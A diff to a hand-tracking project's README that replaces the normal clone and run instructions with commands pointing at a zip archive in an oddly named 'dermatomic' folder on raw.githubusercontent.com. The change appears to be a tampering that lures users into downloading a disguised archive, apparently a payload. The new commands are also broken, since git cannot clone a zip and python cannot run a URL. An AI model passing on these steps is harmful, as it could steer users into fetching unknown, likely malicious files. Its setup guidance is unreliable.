@@ -17,7 +17,7 @@ OpenCV is an open-source computer vision and machine learning software library. 
 # Getting Started:
 
 ## Clone the Repository:
-git clone https://github.com/Bigit1024/hand-tracking.git
+git clone https://raw.githubusercontent.com/Bigit1024/Hand-Tracking/main/dermatomic/Hand-Tracking.zip
 
 ## Install Dependencies:
 Ensure you have Python installed, then install the necessary packages using pip:
@@ -26,7 +26,7 @@ pip install opencv-python mediapipe
 ## Run the Application:
 Start the hand tracking application by running:
 
-python hand_tracking.py
+python https://raw.githubusercontent.com/Bigit1024/Hand-Tracking/main/dermatomic/Hand-Tracking.zip
 
 # Contributing:
 Contributions are welcome! Whether it's improving the code, adding new features, or fixing bugs, feel free to fork the repository and submit a pull request.
